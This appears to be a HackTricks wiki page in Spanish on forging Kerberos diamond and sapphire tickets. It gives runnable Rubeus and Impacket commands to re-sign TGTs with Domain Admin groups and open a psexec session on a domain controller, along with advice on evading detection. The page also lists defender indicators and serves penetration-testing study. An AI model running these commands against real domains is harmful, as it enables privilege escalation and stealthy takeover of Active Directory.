# Diamond Ticket

{{#include ../../banners/hacktricks-training.md}}

## Diamond Ticket

**Al igual que un golden ticket**, un diamond ticket es un TGT que puede utilizarse para **acceder a cualquier servicio como cualquier usuario**. Un golden ticket se falsifica completamente offline, se cifra con el hash de krbtgt de ese dominio y luego se introduce en una sesión de logon para utilizarlo. Debido a que los controladores de dominio no rastrean los TGT que han emitido legítimamente, aceptarán sin problemas los TGT cifrados con su propio hash de krbtgt.<sup>[[1]](#references)</sup>

Existen dos técnicas comunes para detectar el uso de golden tickets:

- Buscar TGS-REQs que no tengan un AS-REQ correspondiente.
- Buscar TGTs con valores absurdos, como la duración predeterminada de 10 años de Mimikatz.

Un **diamond ticket** se crea **modificando los campos de un TGT legítimo emitido por un DC**. Esto se consigue **solicitando** un **TGT**, **descifrándolo** con el hash de krbtgt del dominio, **modificando** los campos deseados del ticket y, después, **volviendo a cifrarlo**. Esto **soluciona las dos deficiencias mencionadas anteriormente** de un golden ticket porque:<sup>[[1]](#references)</sup>

- Los TGS-REQs tendrán un AS-REQ precedente.
- El TGT fue emitido por un DC, lo que significa que contendrá todos los detalles correctos de la política Kerberos del dominio. Aunque estos pueden falsificarse con precisión en un golden ticket, el proceso es más complejo y está más expuesto a errores.

### Requisitos y flujo de trabajo

- **Material criptográfico**: la clave AES256 de krbtgt (preferida) o el hash NTLM para descifrar y volver a firmar el TGT.
- **Blob de TGT legítimo**: obtenido con `/tgtdeleg`, `asktgt`, `s4u` o exportando tickets de la memoria.
- **Datos de contexto**: el RID del usuario objetivo, los RIDs/SIDs de los grupos y, opcionalmente, los atributos del PAC obtenidos mediante LDAP.
- **Claves de servicio** (solo si se planea volver a crear service tickets): la clave AES del SPN del servicio que se va a suplantar.

1. Obtener un TGT para cualquier usuario bajo nuestro control mediante AS-REQ (`/tgtdeleg` de Rubeus es práctico porque fuerza al cliente a realizar el intercambio Kerberos GSS-API sin credenciales).
2. Descifrar el TGT devuelto con la clave de krbtgt y modificar los atributos del PAC (usuario, grupos, información de logon, SIDs, device claims, etc.).
3. Volver a cifrar y firmar el ticket con la misma clave de krbtgt e inyectarlo en la sesión de logon actual (`kerberos::ptt`, `Rubeus.exe ptt`...).
4. Opcionalmente, repetir el proceso con un service ticket proporcionando un blob de TGT válido y la clave del servicio objetivo para mantener el sigilo en la red.

### Técnicas actualizadas de Rubeus (2024+)

Trabajos recientes de Huntress modernizaron la acción `diamond` de Rubeus trasladando las mejoras de `/ldap` y `/opsec`, que anteriormente solo existían para golden/silver tickets. `/ldap` ahora obtiene contexto PAC real consultando LDAP y montando SYSVOL para extraer atributos de cuentas/grupos, además de la política de Kerberos/contraseñas (por ejemplo, `GptTmpl.inf`), mientras que `/opsec` hace que el flujo AS-REQ/AS-REP coincida con el de Windows al realizar el intercambio de preautenticación en dos pasos y aplicar KDCOptions realistas y únicamente AES. Esto reduce drásticamente indicadores evidentes, como campos del PAC ausentes o duraciones que no coinciden con la política.<sup>[[3]](#references)</sup>
```powershell
# Query RID/context data (PowerView/SharpView/AD modules all work)
Get-DomainUser -Identity <username> -Properties objectsid | Select-Object samaccountname,objectsid

# Craft a high-fidelity diamond TGT and inject it
./Rubeus.exe diamond /tgtdeleg \
/ticketuser:svc_sql /ticketuserid:1109 \
/groups:512,519 \
/krbkey:<KRBTGT_AES256_KEY> \
/ldap /ldapuser:MARVEL\loki /ldappassword:Mischief$ \
/opsec /nowrap
```
- `/ldap` (con `/ldapuser` y `/ldappassword` opcionales) consulta AD y SYSVOL para replicar los datos de la política PAC del usuario objetivo.
- `/opsec` fuerza un reintento de AS-REQ similar al de Windows, pone a cero los flags ruidosos y se limita a AES256.
- `/tgtdeleg` evita acceder a la contraseña en texto claro o a la clave NTLM/AES de la víctima, y aun así devuelve un TGT que se puede descifrar.

### Reemisión de tickets de servicio

La misma actualización de Rubeus añadió la capacidad de aplicar la técnica diamond a blobs TGS. Al proporcionar a `diamond` un **TGT codificado en base64** (de `asktgt`, `/tgtdeleg` o un TGT falsificado previamente), el **SPN del servicio** y la **clave AES del servicio**, puedes acuñar tickets de servicio realistas sin tocar el KDC, lo que equivale a un silver ticket más sigiloso.<sup>[[3]](#references)</sup>
```powershell
./Rubeus.exe diamond \
/ticket:<BASE64_TGT_OR_KRB-CRED> \
/service:cifs/dc01.lab.local \
/servicekey:<AES256_SERVICE_KEY> \
/ticketuser:svc_sql /ticketuserid:1109 \
/ldap /opsec /nowrap
```
Este workflow es ideal cuando ya controlas una service account key (por ejemplo, obtenida con `lsadump::lsa /inject` o `secretsdump.py`) y quieres generar un TGS puntual que coincida perfectamente con la policy de AD, los timelines y los datos del PAC, sin emitir ningún tráfico AS/TGS nuevo.<sup>[[3]](#references)</sup>

### Sapphire-style PAC swaps (2025)

Una variante más reciente, denominada a veces **sapphire ticket**, combina la base del **real TGT** de Diamond con **S4U2self+U2U** para robar un PAC privilegiado e insertarlo en tu propio TGT. En lugar de inventar SIDs adicionales, solicitas un ticket U2U S4U2self para un usuario con altos privilegios, donde el `sname` apunta al requester con pocos privilegios; el KRB_TGS_REQ incluye el TGT del requester en `additional-tickets` y establece `ENC-TKT-IN-SKEY`, lo que permite descifrar el service ticket con la key de ese usuario. Después extraes el PAC privilegiado y lo insertas en tu TGT legítimo antes de volver a firmarlo con la key de krbtgt.<sup>[[2]](#references)[[5]](#references)</sup>

`ticketer.py` de Impacket ahora incluye soporte para sapphire mediante `-impersonate` + `-request` (intercambio live con el KDC):<sup>[[2]](#references)[[5]](#references)</sup>
```bash
python3 ticketer.py -request -impersonate 'DAuser' \
-domain 'lab.local' -user 'lowpriv' -password 'Passw0rd!' \
-aesKey '<krbtgt_aes256>' -domain-sid 'S-1-5-21-111-222-333'
# inject resulting .ccache
export KRB5CCNAME=lowpriv.ccache
python3 psexec.py lab.local/DAuser@dc.lab.local -k -no-pass
```
- `-impersonate` acepta un nombre de usuario o SID; `-request` requiere credenciales activas de usuario además del material de clave de krbtgt (AES/NTLM) para descifrar/parchear tickets.

Indicadores clave de OPSEC al usar esta variante:<sup>[[5]](#references)</sup>

- TGS-REQ incluirá `ENC-TKT-IN-SKEY` y `additional-tickets` (el TGT de la víctima), algo poco frecuente en el tráfico normal.
- `sname` suele ser igual al usuario solicitante (acceso self-service), y el Event ID 4769 muestra al caller y al target como el mismo SPN/usuario.
- Espera entradas 4768/4769 emparejadas con el mismo equipo cliente, pero con distintos CNAMES (solicitante de bajos privilegios frente al propietario privilegiado del PAC).

### Notas sobre OPSEC y detección

- Las heurísticas tradicionales de los hunters (TGS sin AS, lifetimes de una década) siguen siendo aplicables a los golden tickets, pero los diamond tickets salen a la luz principalmente cuando el **contenido del PAC o la asignación de grupos parecen imposibles**. Completa todos los campos del PAC (horarios de inicio de sesión, rutas de perfiles de usuario, IDs de dispositivos) para que las comparaciones automatizadas no marquen inmediatamente la falsificación.<sup>[[3]](#references)</sup>
- **No sobredimensiones los grupos/RIDs**. Si solo necesitas `512` (Domain Admins) y `519` (Enterprise Admins), detente ahí y asegúrate de que la cuenta objetivo pertenezca de forma plausible a esos grupos en otras partes de AD. Un exceso de `ExtraSids` es una señal clara.
- Los swaps de estilo Sapphire dejan huellas U2U: `ENC-TKT-IN-SKEY` + `additional-tickets`, además de un `sname` que apunta a un usuario (a menudo el solicitante) en 4769, y un inicio de sesión 4624 posterior originado desde el ticket falsificado. Correlaciona esos campos en lugar de buscar únicamente gaps de no-AS-REQ.<sup>[[5]](#references)</sup>
- Microsoft comenzó a eliminar gradualmente la **emisión de service tickets RC4** debido a CVE-2026-20833; aplicar etypes solo AES en el KDC refuerza el dominio y se alinea con las herramientas de diamond/sapphire (/opsec ya fuerza AES). Mezclar RC4 en PACs falsificados será cada vez más evidente.<sup>[[6]](#references)</sup>
- El proyecto Security Content de Splunk distribuye telemetría de attack-range para diamond tickets, junto con detections como *Windows Domain Admin Impersonation Indicator*, que correlacionan secuencias inusuales de Event ID 4768/4769/4624 y cambios de grupos en el PAC. Reproducir ese dataset (o generar uno propio con los comandos anteriores) ayuda a validar la cobertura del SOC para T1558.001 y, al mismo tiempo, proporciona lógica de alertas concreta que evadir.<sup>[[4]](#references)</sup>

## Referencias

- [1] [Palo Alto Unit 42 – Precious Gemstones: The New Generation of Kerberos Attacks (2022)](https://unit42.paloaltonetworks.com/next-gen-kerberos-attacks/)
- [2] [Core Security – Impacket: We Love Playing Tickets (2023)](https://www.coresecurity.com/core-labs/articles/impacket-we-love-playing-tickets)
- [3] [Huntress – Recutting the Kerberos Diamond Ticket (2025)](https://www.huntress.com/blog/recutting-the-kerberos-diamond-ticket)
- [4] [Splunk Security Content – Diamond Ticket attack data & detections (2023)](https://research.splunk.com/attack_data/be469518-9d2d-4ebb-b839-12683cd18a7c/)
- [5] [Хабр – Теневая сторона драгоценностей: Diamond & Sapphire Ticket (2025)](https://habr.com/ru/articles/891620/)
- [6] [Microsoft – RC4 service ticket enforcement for CVE-2026-20833](https://support.microsoft.com/en-us/topic/how-to-manage-kerberos-kdc-usage-of-rc4-for-service-account-ticket-issuance-changes-related-to-cve-2026-20833-1ebcda33-720a-4da8-93c1-b0496e1910dc)

{{#include ../../banners/hacktricks-training.md}}
